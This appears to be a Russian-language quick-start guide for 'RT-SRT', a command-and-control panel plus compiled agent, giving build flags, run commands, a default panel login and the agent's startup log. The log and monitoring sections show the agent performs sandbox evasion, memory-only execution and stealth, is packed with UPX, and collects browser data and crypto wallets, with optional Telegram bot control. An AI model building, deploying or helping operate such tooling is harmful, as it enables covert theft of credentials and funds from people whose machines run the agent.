# ⚡ RT-SRT Quick Start

## 🚀 Быстрый запуск за 3 минуты

### 1️⃣ Запуск сервера (Terminal 1)
```bash
cd /Users/macbook/Documents/RT-SRT/server

# Активируем Python окружение
source venv/bin/activate

# Запускаем сервер
python src/web_panel/app.py
```

### 2️⃣ Запуск агента (Terminal 2) 
```bash
cd /Users/macbook/Documents/RT-SRT

# Запускаем агент (уже собран)
./dist/rt_srt_agent

# Или если нужна пересборка:
# cd build && cmake --build . --parallel --target rt_srt_agent
```

### 3️⃣ Веб-интерфейс
```
Откройте браузер: http://localhost:8000
Логин: admin
Пароль: changeme
```

---

## 📊 Что вы увидите

### При запуске сервера:
```
INFO:     Started server process
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000
```

### При запуске агента:
```
[INFO] Agent initializing with enhanced systems...
[INFO] Запуск AdvancedSandboxEvasion 2.0...
[INFO] AdvancedSandboxEvasion 2.0: Среда выполнения выглядит легитимной
[INFO] Initializing Secure Network Communications...
[INFO] SSL context initialized successfully for TLS 1.3
[INFO] Initializing AdvancedMemoryLoader for memory-only execution...
[INFO] Agent initialized successfully with enhanced protection
[INFO] Agent started
```

---

## 🎯 Быстрые тесты

### Проверка API:
```bash
# Проверка здоровья сервера
curl http://localhost:8000/api/health

# Список агентов
curl http://localhost:8000/api/agents

# Статистика
curl http://localhost:8000/api/stats
```

### Проверка модулей:
```bash
# В веб-интерфейсе можно:
# - Просматривать логи агентов
# - Управлять агентами через команды
# - Мониторить статистику в реальном времени
# - Просматривать собранные данные
```

---

## ⚙️ Дополнительные опции

### Запуск с Telegram ботом:
```bash
# Отредактируйте .env и добавьте токен бота:
# TELEGRAM_BOT_TOKEN=your-real-token

# Запустите бота (Terminal 3)
cd server
source venv/bin/activate  
python src/bot/bot.py
```

### Сборка с разными модулями:
```bash
cd build

# Минимальная сборка
cmake .. -DENABLE_BROWSER_MODULE=OFF -DENABLE_CRYPTO_MODULE=OFF
cmake --build . --parallel

# Максимальная сборка (по умолчанию)
cmake .. -DENABLE_NETWORK_MODULE=ON -DENABLE_STEALTH_MODULE=ON
cmake --build . --parallel
```

### Сжатие агента:
```bash
# Если установлен UPX
cd build
cmake --build . --target pack_agent
```

---

## 🔧 Устранение проблем

### Сервер не запускается:
```bash
# Переустановить зависимости
cd server
pip install -r requirements.txt

# Проверить порт
lsof -i :8000
```

### Агент не подключается:
```bash
# Проверить настройки в agent/src/main.cpp:
# constexpr const char* PRIMARY_HOST = "localhost:8000";

# Пересобрать при изменениях
cd build
cmake --build . --parallel --target rt_srt_agent
```

### Ошибки компиляции:
```bash
# Очистить и пересобрать
rm -rf build/*
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
cmake --build . --parallel
```

---

## 📈 Мониторинг работы

### Логи сервера:
```bash
# В терминале где запущен сервер можно видеть:
# - Подключения агентов
# - API запросы
# - Ошибки и предупреждения
```

### Логи агента:
```bash
# Агент выводит детальные логи:
# - Результаты sandbox evasion проверок
# - Статус network communications  
# - Работу memory-only execution
# - Сбор данных браузеров и crypto wallets
```

### Веб-интерфейс:
```
http://localhost:8000/
- Dashboard со статистикой
- Список активных агентов
- Просмотр логов в реальном времени
- Управление агентами через команды
```

---

## 🎊 Готово!

Система RT-SRT запущена и работает! 

### ✅ Проверочный список:
- [ ] Сервер запущен на http://localhost:8000
- [ ] Агент подключился и активен
- [ ] Веб-интерфейс доступен
- [ ] API отвечает на запросы
- [ ] Логи поступают в интерфейс

**Наслаждайтесь всеми возможностями RT-SRT! 🚀**